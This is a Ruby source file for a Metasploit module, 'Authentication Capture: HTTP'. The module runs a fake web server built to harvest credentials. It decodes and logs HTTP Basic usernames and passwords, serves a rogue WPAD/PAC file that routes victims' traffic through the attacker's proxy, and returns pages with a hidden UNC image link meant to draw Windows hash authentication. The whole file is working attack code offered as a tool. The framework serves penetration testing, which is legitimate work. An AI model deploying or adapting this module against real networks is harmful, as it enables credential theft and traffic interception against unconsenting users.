##
# $Id: socks_unc.rb 5069 2007-08-08 02:46:31Z hdm $
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##


require 'msf/core'

module Msf

class Auxiliary::Server::Capture::HTTP < Msf::Auxiliary

	include Exploit::Remote::TcpServer
	include Auxiliary::Report

	
	def initialize
		super(
			'Name'        => 'Authentication Capture: HTTP',
			'Version'     => '$Revision: 5069 $',
			'Description'    => %q{
				This module provides a fake HTTP service that
			is designed to capture authentication credentials.
			},
			'Author'      => ['ddz', 'hdm'],
			'License'     => MSF_LICENSE,
			'Actions'     =>
				[
				 	[ 'Capture' ]
				],
			'PassiveActions' => 
				[
					'Capture'
				],
			'DefaultAction'  => 'Capture'
		)

		register_options(
			[
				OptPort.new('SRVPORT',    [ true, "The local port to listen on.", 80 ])
			], self.class)
	end

	def setup
		super
		@state = {}
	end

	def run
		exploit()
	end
	
	def on_client_connect(c)
		@state[c.peerhost] ||= {
			:ip    => c.peerhost, 
			:sites => {}
		}
		c.extend(Rex::Proto::Http::ServerClient)
		c.init_cli(self)
	end
	
	def on_client_data(cli)
		begin
			case cli.request.parse(cli.get)
				when Rex::Proto::Http::Packet::ParseCode::Completed
					dispatch_request(cli, cli.request)

					cli.reset_cli
				when  Rex::Proto::Http::Packet::Packet::ParseCode::Error
					close_client(cli)
			end
		rescue EOFError
			if (cli.request.completed?)
				dispatch_request(cli, cli.request)

				cli.reset_cli
			end

			close_client(cli)
		end
							
	end

	def close_client(cli)
	end
	
	def dispatch_request(cli, req)
	
		if(req['Authorization'] and req['Authorization'] =~ /basic/i)
			basic,auth = req['Authorization'].split(/\s+/)
			user,pass  = Rex::Text.decode_base64(auth).split(':', 2)
			report_auth_info(
				:host      => cli.peerhost,
				:proto     => 'http',
				:targ_host => req['Host'] || datastore['SRVHOST'],
				:targ_port => datastore['SRVPORT'],
				:user      => user,
				:pass      => pass,
				:extra     => req.resource.to_s
			)
			print_status("HTTP LOGIN #{req['Host']}:#{datastore['SRVPORT']} #{user} / #{pass} => #{req.resource}")
		end
		
		if(req.resource =~ /^wpad.dat|.*\.pac$/i) 
			prx = "function FindProxyForURL(url, host) { return 'PROXY #{Rex::Socket.source_address(cli.peerhost)}:#{datastore['SRVPORT']}'; }"
			res = 
				"HTTP/1.1 200 OK\r\n" +
				"Host: #{req['Host'] || datastore['SRVHOST']}\r\n" +
				"Content-Type: application/x-ns-proxy-autoconfig\r\n" +
				"Content-Length: #{prx.length}\r\n" +
				"Connection: Close\r\n\r\n#{prx}"
			print_status("HTTP wpad.dat sent to #{cli.peerhost}")
			cli.put(res)
			return
		end
		
		print_status("HTTP REQUEST #{req['Host']}:#{datastore['SRVPORT']} #{req.resource}")
		
		data = "<html><head><title>Connecting...</title></head><body><img src='\\\\#{Rex::Socket.source_address(cli.peerhost)}\\public\\loading.jpg' width='1' height='1'></body></html>"
		res  = 
			"HTTP/1.1 200 OK\r\n" +
			"Host: #{req['Host'] || datastore['SRVHOST']}\r\n" +
			"Content-Type: text/html\r\n" +
			"Content-Length: #{data.length}\r\n" +
			"Connection: Close\r\n\r\n#{data}"

		cli.put(res)
		return		
	
	end



end
end
